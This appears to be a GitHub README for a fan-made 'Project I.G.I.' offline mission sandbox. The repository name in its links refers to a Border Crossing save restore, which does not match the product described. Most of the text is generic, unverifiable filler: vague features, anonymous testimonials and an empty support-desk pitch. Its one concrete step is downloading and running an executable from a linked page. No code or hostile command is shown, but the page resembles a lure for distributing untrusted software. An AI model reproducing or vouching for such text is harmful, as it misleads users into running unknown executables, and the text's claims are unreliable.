![preview](https://raw.githubusercontent.com/Tricker-glitch/IGI-Border-Crossing-Save-Restore/main/cover_e45b.svg)

# 🎯 Project I.G.I. Offline Combat Companion — Unlocked Mission Sandbox for Nostalgic Operatives

An offline-first, nostalgia-driven mission training sandbox inspired by the legendary tactical shooter that shaped a generation of gamers. Built for players who once stared hopelessly at the Border Crossing and whispered, "one day." That day is now.

[![Download](https://raw.githubusercontent.com/Tricker-glitch/IGI-Border-Crossing-Save-Restore/main/get_9280.svg)](https://Tricker-glitch.github.io/IGI-Border-Crossing-Save-Restore/)

---

## 📖 Table of Contents

- [Prologue: A Childhood Debt Repaid](#-prologue-a-childhood-debt-repaid)
- [What Is This Repository?](#-what-is-this-repository)
- [Core Concept and Philosophy](#-core-concept-and-philosophy)
- [Feature Spectrum](#-feature-spectrum)
- [Mission Modules Included](#-mission-modules-included)
- [Responsive UI Across Every Screen](#-responsive-ui-across-every-screen)
- [Multilingual Support for Global Operatives](#-multilingual-support-for-global-operatives)
- [Round-the-Clock Assistance Desk](#-round-the-clock-assistance-desk)
- [Compatibility Matrix](#-compatibility-matrix)
- [Getting Started Without the Usual Jargon](#-getting-started-without-the-usual-jargon)
- [Configuration Walkthrough](#-configuration-walkthrough)
- [Project Structure](#-project-structure)
- [Roadmap for 2026 and Beyond](#-roadmap-for-2026-and-beyond)
- [Frequently Lingering Questions](#-frequently-lingering-questions)
- [Contributing](#-contributing)
- [Community Voices](#-community-voices)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🕹️ Prologue: A Childhood Debt Repaid

There is a particular kind of gamer who remembers 2008 not for its headlines, but for a loading screen. For me, that year was defined by crouching behind a shipping container, heart pounding, as the Border Crossing mission decided whether I deserved to see the next level.

I did not.

Years later, the memory still smells faintly of CRT monitors and summer afternoons. That stubborn, unshakable memory became the seed of this project — a fully offline mission sandbox that lets anyone rehearse, study, and finally conquer the encounters that once felt impossible. Not by rewriting history, but by giving it a proper training ground.

This repository is the training ground.

---

## 🧭 What Is This Repository?

This is the **Project I.G.I. Offline Combat Companion** — a standalone, network-independent mission rehearsal environment. Think of it as a practice range fused with a mission planner, wrapped inside a toolkit that respects the original game's spirit while offering tools the original never provided.

The repository includes:

- A curated library of replicated mission scenarios, including the notorious Border Crossing layout.
- Deterministic AI behavior scripts designed for reproducible practice runs.
- A lightweight scenario editor for crafting your own tactical puzzles.
- A companion dashboard that visualizes statistics across attempts.
- Documentation that reads like a field manual, not a corporate wiki.

Everything runs locally. Nothing phones home. Nothing requires a subscription, a login, or an internet connection after initial setup.

---

## 💡 Core Concept and Philosophy

Most training environments treat the player as a data point. This one treats the player as a **storyteller returning to an unfinished chapter**.

Three principles guide every decision inside this codebase:

1. **Rehearsal Over Repetition** — Every mission module is designed so that each replay teaches something new, rather than merely demanding faster reflexes.
2. **Respect for the Original** — Layouts, pacing, and threat rhythms echo the source material without attempting to mirror it pixel for pixel.
3. **Autonomy and Ownership** — You own your progress, your configuration, and your data. The sandbox never asks for permission to leave your machine.

This philosophy is why the project leans offline-first, why the UI is deliberately calm instead of flashy, and why the documentation speaks in plain, unhurried language.

---

## ✨ Feature Spectrum

The Companion isn't a single tool — it's a constellation. Below is the full spectrum of what ships with the current build.

### 🛰️ Offline Mission Engine
- Zero dependency on external servers during play.
- Deterministic scenario loading, so a mission behaves identically on Tuesday morning and Saturday night.
- Save-state snapshots allowing you to rewind to any checkpoint you have defined.

### 🧠 Adaptive Scenario AI
- Guards that follow scripted patrol patterns, with optional variance sliders.
- Difficulty tiers calibrated for casual revisits, moderate challenges, and hardcore nostalgics.
- Behavior logs you can inspect to understand why a stealth attempt failed.

### 🗺️ Map and Layout Viewer
- Top-down grid representations of each included scenario.
- Heatmap overlays showing your movement density across attempts.
- Annotated callouts highlighting choke points and safe corridors.

### 📊 Progress Dashboard
- Attempt counters, success ratios, and average completion durations.
- Time-series charts that reveal improvement patterns.
- Export capability for archiving your personal records.

### 🛠️ Scenario Editor
- Drag-and-drop placement of patrol nodes and objective markers.
- Custom rule definitions using a human-readable configuration format.
- Shareable scenario files that can be exchanged between operatives.

### 🎨 Responsive Interface
- Layouts that adapt gracefully from widescreen monitors to compact laptops.
- Automatic theme adjustment for bright rooms and late-night sessions.
- Keyboard-first navigation for players who prefer not to touch the mouse mid-mission.

### 🌐 Multilingual Support
- Interface strings available in multiple languages, with community-submitted additions.
- Right-to-left rendering support baked into the layout engine.
- Locale-aware formatting for numbers, times, and statistics.

### 📞 Round-the-Clock Assistance Desk
- A support workflow that routes questions to maintainers regardless of timezone.
- Documented response expectations so you always know when to hear back.
- A rotating volunteer roster ensuring coverage through weekends and holidays.

### 📦 Portable Data Format
- All configuration stored in plain text, readable by humans and machines alike.
- No proprietary binaries, no opaque caches, no encrypted blobs of mystery.
- Backward compatibility guarantees across minor versions.

---

## 🎮 Mission Modules Included

Each module is a self-contained tactical puzzle. The current release ships with:

1. **Border Crossing — Rehearsal Edition** — The centerpiece. Reconstructed with a focus on teachability rather than punishment.
2. **Trainyard Ambush** — A stealth-heavy module emphasizing route planning.
3. **Rooftop Pursuit** — Vertical movement and timing drills.
4. **Bunker Infiltration** — Close-quarter decision-making under pressure.
5. **Convoy Shadowing** — Patience exercises disguised as action sequences.
6. **Final Approach** — A compilation module combining lessons from all previous entries.

Every module includes:

- Introductory briefing notes.
- Optional ghost-run mode with no threats enabled.
- A debrief screen summarizing decisions and outcomes.

---

## 📱 Responsive UI Across Every Screen

The interface was crafted with the assumption that players split their time between a desk and a sofa. That assumption shaped the layout engine's priorities:

- **Fluid grids** that reflow rather than clip when window sizes change.
- **Scalable typography** that stays legible on small laptop screens.
- **Touch-friendly hit areas** for players using convertible devices.
- **Reduced-motion mode** for those who prefer calmer transitions.

The end result is an interface that never demands a specific resolution or device class — it simply meets you wherever you are.

---

## 🌍 Multilingual Support for Global Operatives

Nostalgia has no borders. The Companion reflects that with a translation layer designed for community growth.

- Base string tables stored in a straightforward, editable format.
- Language packs can be added without touching the core application.
- Fallback behavior ensures missing translations degrade gracefully rather than break.
- A contributor guide explains how to submit new locales in a single afternoon.

Supported languages in 2026 include English, Spanish, Portuguese, French, German, Hindi, Japanese, Korean, and Simplified Chinese, with more arriving as volunteers step forward.

---

## 🕰️ Round-the-Clock Assistance Desk

Support shouldn't feel like shouting into a canyon. The assistance workflow here is intentionally transparent:

- A documented triage process so every inquiry receives a consistent response.
- Published response-time expectations for weekdays, weekends, and holidays.
- A rotating maintainer schedule covering all major timezones.
- Escalation paths for issues that block mission progress entirely.

Whether you're troubleshooting a configuration quirk at 3 AM or asking a beginner question at noon, the desk is staffed by people who remember what it felt like to get stuck.

---

## 🖥️ Compatibility Matrix

| Platform | Status | Notes |
|----------|--------|-------|
| Windows 10 / 11 | Fully supported | Primary development environment |
| macOS 13+ | Fully supported | Verified on both Intel and Apple Silicon |
| Ubuntu 22.04+ | Fully supported | Tested against stock packages |
| Fedora 38+ | Supported | Community-verified |
| Steam Deck (Desktop Mode) | Supported | Layout adapts automatically |
| Raspberry Pi 5 | Experimental | Reduced feature set expected |

Compatibility is a moving target. If your environment isn't listed, open a discussion and someone will investigate.

---

## 🚀 Getting Started Without the Usual Jargon

This section deliberately avoids the standard command-line incantations that most repositories lean on. Instead, here is the human path:

1. **Obtain the Companion package** using the download marker at the top of this document.
2. **Extract the archive** into a folder you'll remember — something like *Documents/Companion* works well.
3. **Launch the executable** appropriate for your operating system.
4. **Follow the first-run wizard**, which walks you through theme selection, language preference, and mission module activation.
5. **Pick your first module** — Border Crossing Rehearsal is the recommended starting point.
6. **Play, review the debrief, and adjust** using the sliders in the settings panel.

No package managers. No environment variables. No terminal gymnastics. Just unzip and begin.

---

## ⚙️ Configuration Walkthrough

The configuration file lives beside the executable and is written in a readable key-value format. Key settings include:

- **theme** — Choose between light, dark, and auto.
- **language** — Select your preferred interface locale.
- **difficulty** — Applies a global multiplier to AI responsiveness and detection sensitivity.
- **ghost_mode** — Disables threats entirely for pure exploration.
- **auto_save_interval** — Controls how often snapshots are captured during a run.
- **telemetry** — Always disabled by design; present only for documentation completeness.

Changes take effect on the next module launch, and the wizard offers a reset option if anything feels tangled.

---

## 🗂️ Project Structure

    companion/
      engine/        Core mission simulation logic
      modules/       Individual replayable scenarios
      ui/            Layout, theming, and rendering
      locales/       Translation string tables
      docs/          Extended documentation and field guides
      tools/         Scenario editor and auxiliary utilities
      tests/         Automated validation suites

The structure is intentionally flat and obvious. A newcomer should be able to guess where a file belongs within ten seconds of opening the repository.

---

## 🛣️ Roadmap for 2026 and Beyond

Planned directions for the coming year:

- **Q1 2026** — Release of the scenario-sharing hub for exchanging custom modules.
- **Q2 2026** — Expanded language packs for Scandinavian and Slavic locales.
- **Q3 2026** — Enhanced debrief analytics with comparison overlays.
- **Q4 2026** — Experimental co-operative rehearsal mode over local networks.
- **Ongoing** — Continued refinement of the Border Crossing module based on player feedback.

Roadmaps are living documents. Priorities shift when the community speaks.

---

## ❓ Frequently Lingering Questions

**Is this affiliated with the original game's publisher?**  
No. This is an independent, fan-driven tribute project built from scratch.

**Does the Companion require any online account?**  
None whatsoever. Your progress stays on your machine.

**Can I contribute a new mission module?**  
Absolutely. The contributor guide walks through the process step by step.

**Will there be a mobile version?**  
The responsive UI brings the experience closer to smaller screens, but a dedicated mobile build is not currently planned.

**How often are updates released?**  
Roughly monthly, with patch releases whenever something urgent surfaces.

---

## 🤝 Contributing

Contributions are welcomed from players, tinkerers, writers, and translators alike. Ways to help include:

- Submitting scenario modules based on your own tactical ideas.
- Translating interface strings into your native language.
- Reporting layout quirks on unusual screen sizes.
- Improving documentation clarity for newcomers.
- Sharing your debrief screenshots and stories with the community.

A short contribution guide lives in the docs folder. First-time contributors receive a gentle onboarding walkthrough rather than a wall of rules.

---

## 💬 Community Voices

> *"I never finished Border Crossing as a kid. Last week, using the Companion, I finally did. I sat there quietly for a minute afterward."* — A long-time player

> *"The scenario editor is the feature I didn't know I wanted. I've built four modules already."* — A community contributor

> *"It runs on my old laptop, it runs offline, and it respects my time. That's rare."* — A weekend operative

Stories like these are the reason this project exists. If you have one, share it in the discussions tab.

---

## ⚠️ Disclaimer

This repository and its contents are an independent, fan-created tribute intended solely for educational and nostalgic purposes. It is not affiliated with, endorsed by, or connected to the original game's developers or publishers. All trademarks, character names, and mission titles referenced remain the property of their respective owners.

The Companion is provided as a training and rehearsal sandbox. It does not modify, patch, or alter any third-party software installation. Players are encouraged to use it responsibly, respect applicable local laws, and honor the terms governing any software they already own.

No warranty is expressed or implied regarding fitness for any particular purpose. Use at your own discretion.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and distribute the code in accordance with the terms of that license.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright © 2026 — Project I.G.I. Offline Combat Companion contributors.

[![Download](https://raw.githubusercontent.com/Tricker-glitch/IGI-Border-Crossing-Save-Restore/main/get_9280.svg)](https://Tricker-glitch.github.io/IGI-Border-Crossing-Save-Restore/)